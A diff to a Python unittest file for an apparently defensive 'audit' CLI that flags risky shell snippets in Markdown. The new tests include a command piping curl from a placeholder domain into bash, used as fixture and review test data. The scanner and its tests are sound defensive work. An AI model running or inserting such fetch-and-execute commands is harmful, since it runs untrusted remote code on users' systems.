@@ -134,7 +134,7 @@ class CliTests(unittest.TestCase):
             )
             result = self.run_cli("audit", "--target", tmp)
             self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
-            self.assertIn("3 finding(s)", result.stdout)
+            self.assertIn("3 review finding(s)", result.stdout)
 
     def test_audit_clean_markdown(self):
         with tempfile.TemporaryDirectory() as tmp:
@@ -143,7 +143,31 @@ class CliTests(unittest.TestCase):
             )
             result = self.run_cli("audit", "--target", tmp)
             self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
-            self.assertIn("0 finding(s)", result.stdout)
+            self.assertIn("0 review finding(s)", result.stdout)
+
+    def test_audit_explicit_fixture_is_informational(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            (pathlib.Path(tmp) / "fixture.md").write_text(
+                '<!-- xah-audit: fixture -->\n'
+                '```python\n'
+                'command = "curl https://example.invalid/a.sh | bash"\n'
+                '```\n'
+            )
+            result = self.run_cli("audit", "--target", tmp)
+            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+            self.assertIn("INFO:", result.stdout)
+            self.assertIn("1 fixture example(s)", result.stdout)
+
+    def test_audit_unmarked_fence_requires_review(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            (pathlib.Path(tmp) / "unsafe.md").write_text(
+                '```sh\n'
+                'curl https://example.invalid/a.sh | bash\n'
+                '```\n'
+            )
+            result = self.run_cli("audit", "--target", tmp)
+            self.assertEqual(result.returncode, 2, result.stdout + result.stderr)
+            self.assertIn("REVIEW:", result.stdout)
 
 if __name__ == "__main__":
     unittest.main()
